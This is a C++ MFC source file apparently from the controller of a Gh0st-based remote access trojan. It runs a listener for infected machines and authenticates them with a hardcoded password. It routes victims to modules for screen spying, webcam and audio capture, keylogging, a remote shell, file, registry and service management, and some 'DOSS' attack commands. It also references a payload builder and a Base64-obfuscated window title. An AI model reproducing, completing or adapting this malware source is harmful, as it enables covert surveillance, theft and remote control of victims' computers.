// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "MainFrm.h"
#include "Gh0stView.h"

#include "PcView.h"
#include "LogView.h"
#include "ShowNum.h"
//#include "MoreChoose.h"

#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "SerManager.h"
#include "SettingDlg.h"
#include "BuildServer1.h"
#include "UPDATEIP.h"
//#include "Batch.h"
#include "RegDlg.h"
#include "User.h"
//#include "Play.h"
#include "proxy.h"
#include "MyToolsKit.h"
#include "UPDATEIP.h"
//#include "Skin.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define WM_ICONMESSAGE   WM_USER + 100

CPcView* g_pConnectView = NULL; //��NotifyProc�г�ʼ��
extern CGh0stView* g_pTabView;
extern CLogView* g_pLogView;
//extern CUPDATEIP* g_pcupdateip;
//class CUPDATEIP* g_pcupdateip;

CIOCPServer *m_iocpServer = NULL;
CString		m_PassWord = "password";
CMainFrame	*g_pFrame; // ��CMainFrame::CMainFrame()�г�ʼ��

char Bt_szName[150] = {0};//

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_SYSCOMMAND()
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_UPDATE_COMMAND_UI(ID_STAUTSTIP, OnUpdateStatusBar)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_EXIT, OnExit)
	ON_WM_ERASEBKGND()
	ON_COMMAND(IDM_SETTINGS, OnSettings)
	ON_COMMAND(IDM_BUILD, OnBuild)
	ON_COMMAND(ID_APP_EXIT, OnAppExit)
	ON_COMMAND(IDM_TOOLS, OnTools)     //ʵ�ù���
	ON_WM_TIMER()
	ON_MESSAGE(WM_SYSTRAY,OnSystray)
	ON_COMMAND(IDM_NEWSTIPS, OnNewstips)
	ON_UPDATE_COMMAND_UI(ID_STAUTSSPEED, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSPORT, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSCOUNT, OnUpdateStatusBar)
	ON_COMMAND(ID_OPTIONS_FRAMETHEME, OnFrameTheme)
	ON_UPDATE_COMMAND_UI(ID_OPTIONS_FRAMETHEME, OnUpdateFrameTheme)
	//}}AFX_MSG_MAP
	ON_XTP_CREATECONTROL()
	ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)
	ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)	
//	ON_COMMAND_RANGE(ID_OPTIONS_STYLEBLUE, ID_OPTIONS_STYLEWHITE, OnOptionsStyle)
	ON_UPDATE_COMMAND_UI_RANGE(ID_OPTIONS_STYLEBLUE, ID_OPTIONS_STYLEWHITE, OnUpdateOptionsStyle)

	
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_STAUTSSPEED,
	ID_STAUTSPORT,
	ID_STAUTSCOUNT
};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	g_pFrame = this;
/*
	TCHAR szStylesPath[_MAX_PATH];

	VERIFY(::GetModuleFileName(
		AfxGetApp()->m_hInstance, szStylesPath, _MAX_PATH));		
	
	CString csStylesPath(szStylesPath);
	int nIndex  = csStylesPath.ReverseFind(_T('\\'));
	if (nIndex > 0) {
		csStylesPath = csStylesPath.Left(nIndex);
	}
	else {
		csStylesPath.Empty();
	}
	m_csStylesPath += csStylesPath + _T("\\Styles\\");

	CString temp;
	temp += csStylesPath + _T("\\Styles");
 	if (GetFileAttributes( temp ) == 0xFFFFFFFF)
 	{	
		CreateDirectory( temp, NULL );
 	}

	m_bChecked = FALSE;
	m_bAnimation = TRUE;
	m_bLayoutRTL = FALSE;

	ZeroMemory(&m_bOptions, sizeof(m_bOptions));


	// get path of executable	
	LPTSTR lpszExt = _tcsrchr(szStylesPath, '.');
	lstrcpy(lpszExt, _T(".xml"));
	
	m_strIniFileName = szStylesPath;

	m_nColumns = 0;

	m_pItemsShapes = 0;
	m_pItemsStyles = 0;
	m_pItemsStyleSet = 0;
	m_pItemsThemeColors = 0;
	m_pItemsThemeFonts = 0;
	m_pItemsFontTextColor = 0;
	m_pItemsFontBackColor = 0;
	m_pItemsFontFace = 0;
	m_pItemsFontSize = 0;
	m_pItemsColumns = 0;

//	m_nRibbonStyle = ID_OPTIONS_STYLEBLUE;
	m_nRibbonStyle = ID_OPTIONS_STYLEAQUA;
	*/
}

CMainFrame::~CMainFrame()
{
}
BOOL ReleaseRes(CString strFileName,WORD wResID,CString strFileType)    
{    
    // ��Դ��С    
    DWORD   dwWrite=0;          
   
    // �����ļ�    
    HANDLE  hFile = CreateFile(strFileName, GENERIC_WRITE,FILE_SHARE_WRITE,NULL,    
                                CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);    
    if ( hFile == INVALID_HANDLE_VALUE )    
    {    
        return FALSE;    
    }    
   
    // ������Դ�ļ��С�������Դ���ڴ桢�õ���Դ��С    
    HRSRC   hrsc =  FindResource(NULL, MAKEINTRESOURCE(wResID), strFileType);    
    HGLOBAL hG = LoadResource(NULL, hrsc);    
    DWORD   dwSize = SizeofResource( NULL,  hrsc);    
   
    // д���ļ�    
    WriteFile(hFile,hG,dwSize,&dwWrite,NULL);       
    CloseHandle( hFile );    
    return TRUE;    
}
/*
int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	AfxGetApp()->m_nCmdShow = SW_HIDE;
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1) return -1;
	this->CenterWindow(CWnd::GetDesktopWindow());

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	if (!InitCommandBars())
		return -1;

	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars == NULL)
	{
		TRACE0("Failed to create command bars object.\n");
		return -1;      // fail to create
	}

	// Create ToolBar
	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("������(T)"), xtpBarTop);
	if (!pCommandBar ||
		!pCommandBar->LoadToolBar(IDR_TOOLBAR3)) //
	{
		TRACE0("Failed to create toolbar\n");
		return -1;
	}

	
//    LoadIcons();

	CXTPCommandBarsOptions* pOptions = pCommandBars->GetCommandBarsOptions();


	pOptions->bShowExpandButtonAlways= FALSE;

	pOptions->bShowTextBelowIcons = true;
	pOptions->bLargeIcons = TRUE;
	pCommandBar->GetImageManager()->SetIcons(IDR_TOOLBAR3,IDB_BITMAP1);

	RedrawWindow(0, 0, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);   
	GetCommandBars()->GetPaintManager()->RefreshMetrics(); 
	
	ModifyStyle(WS_THICKFRAME, 0);
	ModifyStyle(0, WS_THICKFRAME);
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowNever);


    //��������״̬��
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 250);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 120);


	m_paneManager.InstallDockingPanes(this);
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2010); // ��������

	CXTPDockingPane* pwndPaneLog = CreatePane(235, 150, RUNTIME_CLASS(CLogView), _T("��־��Ϣ"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneNum = CreatePane(58, 150, RUNTIME_CLASS(CShowNum), _T("����ͳ��"), xtpPaneDockRight, pwndPaneLog);
//	CXTPDockingPane* pwndPaneChoose = CreatePane(235, 150, RUNTIME_CLASS(CMoreChoose), _T("ɸѡ����"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneUPDATEIP = CreatePane(235, 150, RUNTIME_CLASS(CUPDATEIP), _T("��������"), xtpPaneDockBottom);
//    CXTPDockingPane* pwndPaneBatch = CreatePane(235, 150, RUNTIME_CLASS(CBatch), _T("��������"), xtpPaneDockBottom);
//	CXTPDockingPane* pwndPaneplay = CreatePane(260, 145, RUNTIME_CLASS(CBuildServer), _T("��������"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneproxy = CreatePane(235, 150, RUNTIME_CLASS(CProxy), _T("�û�����"), xtpPaneDockBottom);

//	m_paneManager.AttachPane( pwndPaneChoose, pwndPaneLog );
	m_paneManager.AttachPane( pwndPaneUPDATEIP, pwndPaneLog);
//	m_paneManager.AttachPane( pwndPaneBatch, pwndPaneChoose);
	m_paneManager.AttachPane( pwndPaneproxy, pwndPaneUPDATEIP );

	pwndPaneLog->Select();
	pwndPaneLog->SetOptions(xtpPaneNoCaption);
	pwndPaneNum->SetOptions(xtpPaneNoCaption);
//	pwndPaneChoose->SetOptions(xtpPaneNoCaption);
	pwndPaneUPDATEIP->SetOptions(xtpPaneNoCaption);
//	pwndPaneBatch->SetOptions(xtpPaneNoCaption);
//	pwndPaneplay->SetOptions(xtpPaneNoCaption);
	pwndPaneproxy->SetOptions(xtpPaneNoCaption);

	return 0;
}

*/

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	AfxGetApp()->m_nCmdShow = SW_HIDE;
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1) return -1;
	this->CenterWindow(CWnd::GetDesktopWindow());

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	if (!InitCommandBars())
		return -1;

	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars == NULL)
	{
		TRACE0("Failed to create command bars object.\n");
		return -1;      // fail to create
	}

    //��������״̬��
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 250);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 120);
/*
	m_wndStatusBar.EnableCustomization();

	if (!m_TrayIcon.Create(_T(""), // Toolktip text
		this,                       // Parent window
		IDR_MAINFRAME,               // Icon resource ID
		IDR_MINIMIZE,             // Resource ID of popup menu
		IDM_SHOW,                // Default menu item for popup menu
		false))                     // True if default menu item is located by position
	{
		TRACE0("Failed to create tray icon\n");
		return -1;
	}
	*/
	

	//�˴�������win7����ϵͳ�г���,ע�ͺ������������  �������Խ���������ж�γ�ʼ�����룬��ɾ��
	CXTPCommandBar* pMenuBar = pCommandBars->SetMenu(_T("Menu Bar"), IDR_MAINFRAME);	//_T()
	pMenuBar->SetFlags(xtpFlagAddMDISysPopup);
		
	CXTPToolBar* pCommandBar = (CXTPToolBar*)(pCommandBars->Add(_T("������(T)"), xtpBarTop));		//Standard
	if (!pCommandBar || !pCommandBar->LoadToolBar(IDR_TOOLBAR3)) //
	{
		TRACE0("Failed to create toolbar\n");
		return -1;
	}
	
	//��ʾ����������
	pCommandBars->GetCommandBarsOptions()->bShowTextBelowIcons = TRUE;
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowWindowsDefault);

/*

	// Create ToolBar
	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("������(T)"), xtpBarTop);
	if (!pCommandBar ||
		!pCommandBar->LoadToolBar(IDR_TOOLBAR3)) //
	{
		TRACE0("Failed to create toolbar\n");
		return -1;
	}

	
//    LoadIcons();

	CXTPCommandBarsOptions* pOptions = pCommandBars->GetCommandBarsOptions();


	pOptions->bShowExpandButtonAlways= FALSE;

	pOptions->bShowTextBelowIcons = true;
	pOptions->bLargeIcons = TRUE;
	pCommandBar->GetImageManager()->SetIcons(IDR_TOOLBAR3,IDB_BITMAP1);

	RedrawWindow(0, 0, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);   
	GetCommandBars()->GetPaintManager()->RefreshMetrics(); 
	
	ModifyStyle(WS_THICKFRAME, 0);
	ModifyStyle(0, WS_THICKFRAME);
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowNever);

*/



	m_paneManager.InstallDockingPanes(this);
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2010); // �������� xtpPaneThemeVisualStudio2010

	CXTPDockingPane* pwndPaneLog = CreatePane(235, 150, RUNTIME_CLASS(CLogView), _T("��־��Ϣ"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneNum = CreatePane(58, 150, RUNTIME_CLASS(CShowNum), _T("����ͳ��"), xtpPaneDockRight, pwndPaneLog);
	//CXTPDockingPane* pwndPaneChoose = CreatePane(235, 150, RUNTIME_CLASS(CMoreChoose), _T("ɸѡ����"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneUPDATEIP = CreatePane(235, 150, RUNTIME_CLASS(CUPDATEIP), _T("��������"), xtpPaneDockBottom);
//    CXTPDockingPane* pwndPaneBatch = CreatePane(235, 150, RUNTIME_CLASS(CBatch), _T("��������"), xtpPaneDockBottom);
//	CXTPDockingPane* pwndPaneplay = CreatePane(260, 145, RUNTIME_CLASS(CBuildServer), _T("��������"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneproxy = CreatePane(235, 150, RUNTIME_CLASS(CProxy), _T("Զ������"), xtpPaneDockBottom);

	//m_paneManager.AttachPane( pwndPaneChoose, pwndPaneLog );
	m_paneManager.AttachPane( pwndPaneUPDATEIP, pwndPaneLog);
//	m_paneManager.AttachPane( pwndPaneBatch, pwndPaneChoose);
	m_paneManager.AttachPane( pwndPaneproxy, pwndPaneUPDATEIP );

	pwndPaneLog->Select();
	pwndPaneLog->SetOptions(xtpPaneNoCaption);
	pwndPaneNum->SetOptions(xtpPaneNoCaption);
//	pwndPaneChoose->SetOptions(xtpPaneNoCaption);
	pwndPaneUPDATEIP->SetOptions(xtpPaneNoCaption);
//	pwndPaneBatch->SetOptions(xtpPaneNoCaption);
//	pwndPaneplay->SetOptions(xtpPaneNoCaption);
	pwndPaneproxy->SetOptions(xtpPaneNoCaption);
/*
	XTPColorManager()->DisableLunaColors(TRUE);
	CXTPPaintManager::SetTheme(xtpThemeOffice2003);
	LoadCommandBars(_T("CommandBars"));
	
	SetTimer(1,1000,NULL); 
*/
	m_hDrawIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_hEmptyIcon = AfxGetApp()->LoadIcon(IDI_SYSTRAY1);
    m_NotifyIcon.cbSize = sizeof(NOTIFYICONDATA); 
	m_NotifyIcon.hWnd = this->GetSafeHwnd(); 

	CString Lineips = Onlinetips();
	CString Lineips1 = OnVoicepromptsm();
	wsprintf(m_NotifyIcon.szTip,"��������: %d̨\n����: %s\n��Ϣ��ʾ: %s",Zjshulian,Lineips1,Lineips);
	m_NotifyIcon.uCallbackMessage = WM_ICONMESSAGE; 
	m_NotifyIcon.uFlags = NIF_MESSAGE|NIF_TIP|NIF_ICON;
	m_NotifyIcon.hIcon = m_hDrawIcon;
	m_NotifyIcon.uID = IDR_MAINFRAME;
	Shell_NotifyIcon(NIM_ADD, &m_NotifyIcon);

     //��ʼ����¼ֵ
//     m_nCurrent = 0;
//	SetTimer(1, 500, NULL);  //������ʱ�� 1


	return 0;
}

CString CMainFrame::Onlinetips()
{
	CString stro;
	BOOL a_chkm = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("����", "poptips", false);
	if(!a_chkm)
		stro = "����";
	else
		stro = "�ر�";

	return stro;
}

CString CMainFrame::OnVoicepromptsm()
{
	CString stro;
	BOOL a_chkm = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("����", "Alarm", false);
	if(a_chkm)
		stro = "����";
	else
		stro = "�ر�";

	return stro;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs

	cs.cx = 925;
	cs.cy = 556;
	cs.style &= ~FWS_ADDTOTITLE;
	cs.style &= ~WS_MAXIMIZEBOX;   //ȥ�����
    cs.style &= ~WS_THICKFRAME;    //��ֹ�û��ı䴰�ڴ�С
	cs.style &= ~FWS_ADDTOTITLE;

	

	CString stra1;
	CUPDATEIP Dig;
//δ���ܱ����������ʼ
// char JS_szName[] = {"�����Զ�̹������ С����ɱ��̳"}; //���ı���
// 	
// 	stra1=JS_szName;      //���ܱ���
// 	cs.lpszName = stra1;
// 	
// 	OnAddSkin();  //��Ƥ��
//δ���ܱ������������

//���ܱ����������ʼ
//	stra1=Dig.Base64Encode(JM_szName);  //���ܱ���  �����Զ��V5.52��2013�ȶ��棩
	char JS_szName[] = {"tPO70sDH1LazzLncwO3I7bz+INfu0MLQ3rjERE9TU7Dm"}; //���ܺ����
	stra1=Dig.Base64Decode(JS_szName);      //���ܱ���
	cs.lpszName = stra1;

	OnAddSkin();  //��Ƥ��
//���ܱ������������
	return TRUE;
}
/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    if (m_hWnd == NULL)
        return;     // null (unattached) windows are valid
	
    // check for special wnd??? values
    ASSERT(HWND_TOP == NULL);       // same as desktop
    if (m_hWnd == HWND_BOTTOM)
        ASSERT(this == &CWnd::wndBottom);
    else if (m_hWnd == HWND_TOPMOST)
        ASSERT(this == &CWnd::wndTopMost);
    else if (m_hWnd == HWND_NOTOPMOST)
        ASSERT(this == &CWnd::wndNoTopMost);
    else
    {
        // should be a normal window
        ASSERT(::IsWindow(m_hWnd));
	}
	//CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers


int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
{
     if (lpCreateControl->nID == ID_APP_EXIT)
     {
          lpCreateControl->pControl = new CXTPRibbonControlSystemPopupBarButton();
          return TRUE;
     }

     return FALSE;
}

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// ��g_pConnectView ���г�ʼ��
		g_pConnectView = (CPcView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView��û��������������ᷢ��
		if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
			return;

		g_pConnectView->m_iocpServer = m_iocpServer;

		//str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		str.Format("����: %.2f kb/s ����: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		g_pFrame->m_wndStatusBar.SetPaneText(1, str);

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	// ����IPCP������
	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
	{
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += "-";
			}
		}
		CTime time = CTime::GetCurrentTime(); ///����CTime���� 
		CString strTime = time.Format("  [ ����ʱ��:%Y��%m��%d�� %Hʱ%M��%S�� ]");
		CString strPort, strLogText;
		m_wndStatusBar.SetPaneText(0, strTime);
		strPort.Format("�����˿�: %d", nPort);
		m_wndStatusBar.SetPaneText(2, strPort);
		strLogText.Format( "ϵͳ�ɹ����� -> �����˿�: [ %d ]", nPort );
		g_pLogView->InsertLogItem( strLogText, 0, 0 );
	}
	else
	{
		str.Format("�����˿�: [%d]��ʧ��,�������ѿ�����һ�����ƶ˻��߶˿ڱ�ռ�ã�", nPort);
		m_wndStatusBar.SetPaneText(0, str);
		m_wndStatusBar.SetPaneText(2, "�����˿�: 0");
		g_pLogView->InsertLogItem( str, 0, 1 );
	}
	
	m_wndStatusBar.SetPaneText(3, "��������: 0");
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
			//DOSS
			///////////////////////��������������///////////////
		case TOKEN_FREE_BEGIN:
			{	
				CString	strFreePro = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "FreePro");
				CString nFreeTime = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "FreeTime");
				CString str;
				str = strFreePro + "|" + nFreeTime;
				int		nPacketLength = str.GetLength() + 2;
				LPBYTE	lpPacket = new BYTE[nPacketLength];
				lpPacket[0] = COMMAND_FREE_PROCESS;
				memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
				m_iocpServer->Send(pContext, lpPacket, nPacketLength);
				delete[] lpPacket;
			}
			break;
		case TOKEN_FREE_FIND:
			{
				g_pConnectView->PostMessage(WM_FREE_YES, 0, (LPARAM)pContext);
			}
			break;
		case TOKEN_FREE_NO:
			{
				g_pConnectView->PostMessage(WM_FREE_NO, 0, (LPARAM)pContext);
			}
			break;
			//////////////////////////////////////////////////////
//DOSS
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case SERMANAGER_DLG:
			((CSerManager *)dlg)->OnReceiveComplete();
			break;	
		case REGEDIT_DLG:             //ע���
            ((CRegDlg *)dlg)->OnReceiveComplete();
			break;
		case USER_DLG:
            ((CUser *)dlg)->OnReceiveComplete();  //������
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // Ҫ����֤
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // �ظ�������
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
 		break;

	case TOKEN_LOGIN: // ���߰�
		{	
			pContext->m_bIsMainSocket = true;
			g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
			// ����
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
		break;

	case TOKEN_DRIVE_LIST: // �������б�
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����,̫��
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // ����
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START: // ���̼�¼��ʼ
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST: // �����б�
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START: // Զ���ն˿�ʼ
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
//	case TOKEN_FINDALL_NO: // ɸѡ������Ϣ
//		g_pConnectView->PostMessage(WM_FINDALL, 0, (LPARAM)pContext);		
//		break;
//	case TOKEN_FIND_NO: // ɸѡ������Ϣ
//		g_pConnectView->PostMessage(WM_FIND, 0, (LPARAM)pContext);		
//		break;
	case TOKEN_SSLIST: // �������
		g_pConnectView->PostMessage(WM_OPENPSERLISTDIALOG, 0, (LPARAM)pContext);
		break;		
	case TOKEN_REGEDIT:   //ע������    
		g_pConnectView->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_USER_LIST:   //����������    
		g_pConnectView->PostMessage(WM_OPENRUSERGDIALOG, 0, (LPARAM)pContext);
		break;
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

// ��Ҫ��ʾ���ȵĴ���
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	int iResult = MessageBox("��ȷ��Ҫ�˳�������", " ��ܰ��ʾ��", MB_ICONQUESTION|MB_YESNO);
    if(iResult != IDYES)
		return ;
	pMainFrame->m_TrayIcon.RemoveIcon();
	m_iocpServer->Shutdown();
	delete m_iocpServer;
	// Save the current state for toolbars and menus.
	SaveCommandBars(_T("CommandBars"));

	///////////////////////����ͼ��ɾ��
	NOTIFYICONDATA tnd;
	tnd.cbSize=sizeof(NOTIFYICONDATA);
	tnd.hWnd=AfxGetMainWnd()->m_hWnd;
	tnd.uID=IDR_MAINFRAME;//��֤ɾ���������ǵ�ͼ��
	Shell_NotifyIcon(NIM_DELETE,&tnd);
	///////////////////////////////

	CFrameWnd::OnClose();
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
/*
	CString stra,strTemp;
	int a = 0;
	CPcView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{	
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		a += pView->m_pListCtrl->GetItemCount();
	}
	stra.Format("��ǰ��������: %d\n�������Σ��ǵý���Ӵ������", a);
*/
	if (nID == SC_MINIMIZE)
	{
//		SkinH_Detach(); //ж��Ƥ��
//		Sleep(50);
//		OnAddSkin();  //����Ƥ��
/*
		m_TrayIcon.Create(_T(Bt_szName), // Toolktip text
		this,                       // Parent window
		IDR_MAINFRAME,               // Icon resource ID
		IDR_MINIMIZE,             // Resource ID of popup menu
		IDM_SHOW,                // Default menu item for popup menu
		false);
		*/
		MinTray=TRUE;  //��С����״̬
		m_TrayIcon.MinimizeToTray(this);


//		NOTIFYICONDATA data={0};
//		_tcscpy_s(data.szInfoTitle,8,_T("Capture")); //������ʾ����

/*
		m_TrayIcon.Create(_T(""), // Toolktip text
		this,                       // Parent window
		NULL,               // Icon resource ID
		NULL,             // Resource ID of popup menu
		NULL,                // Default menu item for popup menu
		false);
*/
